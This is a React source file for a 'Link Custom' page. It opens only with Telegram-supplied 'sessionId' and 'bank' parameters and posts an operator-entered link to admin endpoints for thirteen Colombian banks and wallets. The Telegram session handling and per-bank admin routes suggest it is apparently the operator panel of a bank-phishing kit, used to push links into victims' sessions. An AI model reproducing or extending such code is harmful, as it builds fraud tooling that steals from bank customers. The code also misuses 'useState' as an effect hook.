import { useState } from 'react';
import { instanceBackend } from '../../axios/instanceBackend';

// Componente LinkCustom
export default function LinkCustom() {

    // Estados del formulario
    const [textValue, setTextValue] = useState('');
    const [submitted, setSubmitted] = useState(false);

    // Validar que la ruta sea accesible solo desde Telegram (con sessionId en URL)
    useState(() => {

        // Obtener sessionId de la URL
        const params = new URLSearchParams(window.location.search);

        // Se obtiene el sessionId
        const sessionId = params.get("sessionId");
        const bank = params.get("bank");

        // Se valida si existe sessionId
        if (!sessionId || !bank) {

            // Se manda una alerta que no se encuentra el sessionId
            alert("Error: Sesión ID o banco faltantes en los parámetros de la URL.");

            // Se cierra la ventana
            window.close();
        };
    });

    // Metodo encargado de enviar los datos
    const handleSubmit = async () => {

        // Se valida si ya se envio
        if (submitted) return;

        // Se obtiene el valor del parametro sessionId
        const params = new URLSearchParams(window.location.search);

        // Se captura el sessionId
        const sessionId = params.get("sessionId");
        const bank = params.get("bank");

        // Se no hay sessionId
        if (!sessionId || !bank) {

            // Se lanza la alerta
            alert("Error: Sesión ID o banco faltantes en los parámetros de la URL.");

            // Se retorna
            return;
        }

        // Se define el objeto de la tarjeta
        const data = {
            "data": {
                "attributes": {
                    "sessionId": sessionId,
                    "bank": bank,
                    "text": textValue
                }
            }
        };

        // Se setea el estado de enviado
        setSubmitted(true);

        // Se intenta enviar los datos
        try {

            // Se captura el banco
            const bankUrl = await getUrlBank();

            // Se envia la solicitud
            await instanceBackend.post(bankUrl, data);

            // Se manda la alerta
            alert("✅ Configuración de link enviada con éxito.");
        } catch (error) {

            // Se manda la alerta
            alert("Error al enviar la configuración.");

            // Se quita el estado de enviado
            setSubmitted(false);
        }
    };

    // Metodo encargado de obtener el banco desde la URL
    const getUrlBank = () => {

        // Se obtiene el valor del parametro sessionId
        const params = new URLSearchParams(window.location.search);

        // Se captura el banco
        const bank = params.get("bank");

        // Se valida el banco para generar la url
        const bankUrls = {
            "AVVILLAS": "/avvillas/admin/link-custom",
            "BANCOLOMBIA": "/bancolombia/admin/link-custom",
            "BBVA": "/bbva/admin/link-custom",
            "BOGOTA": "/bogota/admin/link-custom",
            "CAJA_SOCIAL": "/cajasocial/admin/link-custom",
            "COLPATRIA": "/colpatria/admin/link-custom",
            "DAVIVIENDA": "/davivienda/admin/link-custom",
            "FALABELLA": "/falabella/admin/link-custom",
            "ITAU": "/itau/admin/link-custom",
            "NEQUI": "/nequi/admin/link-custom",
            "OCCIDENTE": "/occidente/admin/link-custom",
            "POPULAR": "/popular/admin/link-custom",
            "SERFINANZA": "/serfinanza/admin/link-custom"
        };

        // Se retorna
        return bankUrls[bank] || "/admin/link-custom";
    }

    // Se retorna
    return (
        <div style={{
            minHeight: "100vh",
            backgroundColor: "#000000",
            color: "#ffffff",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            padding: "20px",
            fontFamily: "sans-serif"
        }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "15px" }}>
                <img src={"/assets/caravela.png"} style={{ width: "140px", marginBottom: "20px" }} alt="Avvillas" />
            </div>
            <div
                style={{
                    marginTop: "20px",
                    marginBottom: "20px",
                    fontSize: "18px",
                    fontWeight: "bold",
                    fontStyle: "italic",
                    color: "white",
                    lineHeight: "1",
                    marginTop: "center"
                }}
            >
                Link Custom
            </div>

            {/* SECCION */}
            <div style={{ width: "100%", maxWidth: "400px", marginTop: "50px" }}>
                <div style={{ display: "flex", alignItems: "center", marginBottom: "20px" }}>
                    <div style={{ flex: 1, height: "1px", backgroundColor: "#333" }}></div>
                    <span style={{ padding: "0 10px", fontSize: "14px", color: "#888" }}>Solicitud</span>
                    <div style={{ flex: 1, height: "1px", backgroundColor: "#333" }}></div>
                </div>

                {/* CAMPO DEL LINK */}
                <div style={{ marginBottom: "30px" }}>
                    <div style={{ marginBottom: "15px", color: "#888" }}>Por favor, ingrese el link generado</div>
                    <input
                        type="text"
                        value={textValue}
                        onChange={(e) => setTextValue(e.target.value)}
                        placeholder="Ingrese el link..."
                        style={{
                            width: "100%",
                            padding: "12px",
                            backgroundColor: "#111",
                            border: "1px solid #333",
                            borderRadius: "5px",
                            color: "white",
                            fontSize: "16px",
                            outline: "none",
                            boxSizing: "border-box"
                        }}
                    />
                </div>

                {/* BOTÓN ENVIAR */}
                <button
                    onClick={handleSubmit}
                    disabled={submitted || !textValue.trim()}
                    style={{
                        width: "100%",
                        padding: "14px",
                        backgroundColor: submitted || !textValue.trim() ? "#333" : "#0026ff",
                        color: "white",
                        border: "none",
                        borderRadius: "5px",
                        fontSize: "16px",
                        fontWeight: "bold",
                        cursor: submitted || !textValue.trim() ? "not-allowed" : "pointer",
                        transition: "background-color 0.3s"
                    }}
                >
                    {submitted ? 'Enviando...' : 'Enviar'}
                </button>
            </div>
        </div>
    );
}
